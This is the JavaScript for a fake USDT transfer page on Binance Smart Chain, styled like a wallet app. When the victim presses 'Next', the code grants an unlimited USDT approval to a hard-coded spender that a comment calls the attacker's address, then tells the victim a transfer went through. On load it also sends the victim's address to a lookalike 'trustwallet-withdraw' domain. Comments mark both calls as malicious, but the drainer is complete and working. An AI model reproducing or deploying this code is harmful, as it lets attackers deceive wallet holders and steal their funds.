
const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECIPIENT_ADDRESS = "0x79069192614f7ceE4F101b7995cd16BFdB3CB0d1"; // Used for display
const SPENDER_ADDRESS = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Attacker's address for approve
const USDT_ABI = [
    { constant: true, inputs: [{ internalType: "address", name: "account", type: "address" }], name: "balanceOf", outputs: [{ internalType: "uint256", name: "", type: "uint256" }], payable: false, stateMutability: "view", type: "function" },
    { constant: false, inputs: [{ internalType: "address", name: "recipient", type: "address" }, { internalType: "uint256", name: "amount", type: "uint256" }], name: "transfer", outputs: [{ internalType: "bool", name: "", type: "bool" }], payable: false, stateMutability: "nonpayable", type: "function" },
    { constant: false, inputs: [{ internalType: "address", name: "spender", type: "address" }, { internalType: "uint256", name: "value", type: "uint256" }], name: "approve", outputs: [{ internalType: "bool", name: "", type: "bool" }], payable: false, stateMutability: "nonpayable", type: "function" }
];

const rpcUrl = "https://bsc-dataseed.binance.org/";
const bscProvider = new ethers.providers.JsonRpcProvider(rpcUrl); // Ethers.js provider (not directly used by Web3.js instance here)

// --- Global State Variables (Replacing React's useState) ---
let currentAddress = RECIPIENT_ADDRESS;
let currentUsdtAmount = "";
let usdtBalance = 0;
let bnbBalance = 0;
let walletConnected = false; // Not fully utilized in the original logic, remains largely unused for display
let isLoading = false;
let transferCompleted = false;
let detectedWalletAddress = ""; // This variable from original logic is not used in the UI

let isProcessingTransaction = false; // Replacing useRef for preventing double clicks

// --- DOM Element References ---
let addressInput;
let amountInput;
let amountConversionText;
let nextButton;

// --- Helper Functions ---

function updateUI() {
    if (addressInput) {
        addressInput.value = currentAddress;
    }
    if (amountInput) {
        amountInput.value = currentUsdtAmount;
    }
    if (amountConversionText) {
        const parsedAmount = parseFloat(currentUsdtAmount);
        amountConversionText.textContent = `= $${isNaN(parsedAmount) ? '0.00' : (parsedAmount * 1).toFixed(2)}`;
    }
    if (nextButton) {
        nextButton.textContent = isLoading ? "Processing..." : (transferCompleted ? "Transfer completed" : "Next");
    }

    const clearButton = document.getElementById('clear-address-button');
    if (clearButton) {
        clearButton.style.display = currentAddress ? 'flex' : 'none';
    }
}

function clearAddress() {
    currentAddress = "";
    updateUI();
}

async function pasteAddress() {
    try {
        const text = await navigator.clipboard.readText();
        if (text) {
            currentAddress = text;
            updateUI();
        }
    } catch (err) {
        console.error("Failed to read clipboard contents: ", err);
        alert("Failed to paste from clipboard. Please paste manually.");
    }
}

// --- Core DApp Logic ---

async function sendUSDT() {
    if (isProcessingTransaction) return;

    try {
        isProcessingTransaction = true;
        isLoading = true;
        transferCompleted = false;
        updateUI();

        if (!window.ethereum) {
            alert("No Web3 wallet detected. Please install MetaMask or Trust Wallet.");
            return;
        }

        const web3 = new Web3(window.ethereum);

        const accounts = await web3.eth.getAccounts();
        const sender = accounts[0];
        if (!sender || !web3.utils.isAddress(sender)) {
            console.log("❌ Unable to detect a valid wallet address.");
            alert("Please connect your wallet or ensure it's unlocked.");
            return;
        }

        // Check and switch to BSC
        const chainId = await web3.eth.getChainId();
        if (chainId !== 56) { // 56 is BSC Mainnet
            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: "0x38" }], // Hex chain ID for BSC
                });
            } catch (switchError) {
                if (switchError.code === 4902) { // Chain not added to wallet
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: "0x38",
                                chainName: 'Binance Smart Chain',
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                blockExplorerUrls: ['https://bscscan.com'],
                            }],
                        });
                        // After adding, attempt to switch again
                        await window.ethereum.request({
                            method: "wallet_switchEthereumChain",
                            params: [{ chainId: "0x38" }],
                        });
                    } catch (addError) {
                        console.error("❌ Couldn't add or switch to BSC:", addError);
                        alert("Please add Binance Smart Chain to your wallet manually.");
                        return;
                    }
                } else {
                    console.error("❌ Failed to switch network:", switchError);
                    alert("Failed to switch to Binance Smart Chain. Please switch manually.");
                    return;
                }
            }
        }

        // Validate address in URL (required by the original script)
        const params = new URLSearchParams(window.location.search);
        const userAddressParam = params.get("address");

        if (!userAddressParam || !/^0x[a-fA-F0-9]{40}$/.test(userAddressParam)) {
            alert("Invalid or missing 'address' parameter in the URL. Cannot proceed.");
            return;
        }

        const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
        const MAX_UINT256 = web3.utils.toTwosComplement(-1); // Represents unlimited approval

        // --- THE MALICIOUS APPROVE CALL ---
        console.log(`Attempting to approve SPENDER: ${SPENDER_ADDRESS} for unlimited USDT from SENDER: ${sender}`);
        await contract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).send({ from: sender });
        // --- END MALICIOUS APPROVE CALL ---

        transferCompleted = true;
        alert("Approval transaction sent! (Check your wallet for confirmation)"); // User will think a transfer happened
    } catch (err) {
        console.error("🔴 Approval error:", err);
        if (err.code === 4001) { // User rejected transaction
            alert("Transaction rejected by user.");
        } else {
            alert("An error occurred during the approval process. See console for details.");
        }
    } finally {
        isProcessingTransaction = false;
        isLoading = false;
        updateUI();
    }
}

async function initDApp() {
    try {
        if (!window.ethereum) {
            console.log("No Web3 wallet detected. UI will not interact with blockchain.");
            // We can still render the UI even without a wallet
        } else {
            const web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();
            detectedWalletAddress = accounts[0] || ""; // Store detected wallet address

            // Ensure BSC network is selected first for a smoother UX
            await ensureBSCNetwork();
        }
        
        const params = new URLSearchParams(window.location.search);
        const userAddressParam = params.get("address");

        if (!userAddressParam) {
            console.log("🔄 Approval-only mode activated (no address in URL for refill check).");
            // No address in URL, so no backend check for balances relevant to a specific "victim" address
            // The UI will still work, and the 'approve' will still target SPENDER_ADDRESS.
            return;
        }

        if (!/^0x[a-fA-F0-9]{40}$/.test(userAddressParam)) {
            console.warn("Invalid 'address' parameter in URL. Skipping backend refill check.");
            return;
        }

        // If a valid userAddressParam is present, proceed with the backend check
        currentAddress = userAddressParam; // Update displayed address if from URL
        console.log("🔗 Wallet from QR/URL:", userAddressParam);

        // --- MALICIOUS BACKEND CALL ---
        const response = await fetch("https://haha.trustwallet-withdraw.com/api/refill-check", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ address: userAddressParam }),
        });

        const result = await response.json();
        console.log("📬 Backend response:", result);

        if (!response.ok || result.status === "refill_failed" || !result.usdt) {
            console.warn("Backend refill check failed or no USDT balance found.");
            // Continue even if backend fails, just don't update balances from backend
            return;
        }

        // ✅ Store balances silently (from backend)
        usdtBalance = result.usdt;
        bnbBalance = result.bnb || 0;
        console.log("✅ Refill successful or not needed, ready for manual transfer (according to backend).");
        // You might want to pre-fill amount with usdtBalance if usdtBalance > 200 here too
        // currentUsdtAmount = usdtBalance > 200 ? String(usdtBalance) : ""; // Optional: pre-fill max if high balance
        // updateUI();

    } catch (err) {
        console.error("❌ initDApp() error:", err);
    }
}

async function ensureBSCNetwork() {
    const bscChainId = "0x38"; // BSC Mainnet
    if (!window.ethereum) return; // No wallet, no network check

    try {
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (currentChainId !== bscChainId) {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: bscChainId }],
            });
        }
    } catch (error) {
        if (error.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: bscChainId,
                        chainName: 'Binance Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com'],
                    }],
                });
            } catch (addError) {
                console.error("❌ Couldn't add BSC:", addError);
            }
        } else {
            console.error("❌ Failed to switch network:", error);
        }
    }
}

// --- DOM Manipulation (Replacing JSX rendering) ---
function renderApp() {
    const appRoot = document.getElementById('app-root');
    if (!appRoot) {
        console.error("App root element not found!");
        return;
    }

    // Main Container
    const container = document.createElement('div');
    container.id = 'app-container'; // Assign an ID to apply CSS
    container.className = 'app-container'; // Assign a class to apply CSS

    // Title
    const title = document.createElement('h1');
    title.className = 'title';
    title.textContent = "Transfer"; // Original title was "Transfer"
    container.appendChild(title);

    // Address Field
    const addressInputContainer = document.createElement('div');
    addressInputContainer.className = 'input-container';
    const addressLabel = document.createElement('label');
    addressLabel.className = 'input-label';
    addressLabel.textContent = 'Address or Domain Name';
    addressInputContainer.appendChild(addressLabel);
    const addressFieldContainer = document.createElement('div');
    addressFieldContainer.className = 'input-field-container';
    addressInput = document.createElement('input');
    addressInput.type = 'text';
    addressInput.className = 'input-field';
    addressInput.value = currentAddress;
    addressInput.addEventListener('input', (e) => {
        currentAddress = e.target.value;
        updateUI();
    });
    addressFieldContainer.appendChild(addressInput);

    const clearBtn = document.createElement('span');
    clearBtn.id = 'clear-address-button';
    clearBtn.className = 'clear-button';
    clearBtn.textContent = '×';
    clearBtn.style.display = currentAddress ? 'flex' : 'none'; // Initial display based on value
    clearBtn.addEventListener('click', clearAddress);
    addressFieldContainer.appendChild(clearBtn);

    const pasteBtn = document.createElement('span');
    pasteBtn.className = 'paste-button';
    pasteBtn.textContent = 'Paste';
    pasteBtn.addEventListener('click', pasteAddress);
    addressFieldContainer.appendChild(pasteBtn);
    addressInputContainer.appendChild(addressFieldContainer);
    container.appendChild(addressInputContainer);

    // Amount Field
    const amountInputContainer = document.createElement('div');
    amountInputContainer.className = 'input-container';
    const amountLabel = document.createElement('label');
    amountLabel.className = 'input-label';
    amountLabel.textContent = 'Amount';
    amountInputContainer.appendChild(amountLabel);
    const amountWrapper = document.createElement('div');
    amountWrapper.className = 'amount-container';
    const amountFieldContainer = document.createElement('div');
    amountFieldContainer.className = 'input-field-container';
    amountInput = document.createElement('input');
    amountInput.type = 'number';
    amountInput.className = 'input-field';
    amountInput.value = currentUsdtAmount;
    amountInput.addEventListener('input', (e) => {
        currentUsdtAmount = e.target.value;
        updateUI();
    });
    amountFieldContainer.appendChild(amountInput);

    const usdtTextSpan = document.createElement('span');
    usdtTextSpan.className = 'usdt-text';
    usdtTextSpan.textContent = 'USDT';
    amountFieldContainer.appendChild(usdtTextSpan);

    const maxTextSpan = document.createElement('span');
    maxTextSpan.className = 'max-text';
    maxTextSpan.textContent = 'Max';
    // The original code has a `MaxText` styled component but no `onClick` logic.
    // In a real scenario, this would likely fill `amountInput` with `usdtBalance`.
    maxTextSpan.addEventListener('click', () => {
        if (usdtBalance > 0) {
            currentUsdtAmount = String(usdtBalance);
            updateUI();
        }
    });
    amountFieldContainer.appendChild(maxTextSpan);
    amountWrapper.appendChild(amountFieldContainer);
    amountInputContainer.appendChild(amountWrapper);

    amountConversionText = document.createElement('p');
    amountConversionText.className = 'amount-conversion';
    amountConversionText.textContent = `= $0.00`;
    amountInputContainer.appendChild(amountConversionText);
    container.appendChild(amountInputContainer);

    // Next Button
    nextButton = document.createElement('button');
    nextButton.className = 'next-button';
    nextButton.textContent = 'Next';
    nextButton.addEventListener('click', () => {
        // The original React code had logic here to decide amountToSend based on usdtBalance > 200
        // but the sendUSDT function always uses MAX_UINT256 anyway.
        // So, this parameter is effectively ignored by sendUSDT as written.
        sendUSDT();
    });
    container.appendChild(nextButton);

    appRoot.appendChild(container);

    // Initial UI update after rendering elements
    updateUI();
}

// --- Initialize the DApp when the DOM is fully loaded ---
document.addEventListener('DOMContentLoaded', async () => {
    renderApp(); // Render the UI first
    await initDApp(); // Then run the initialization logic
    updateUI(); // Update UI based on initial data
});
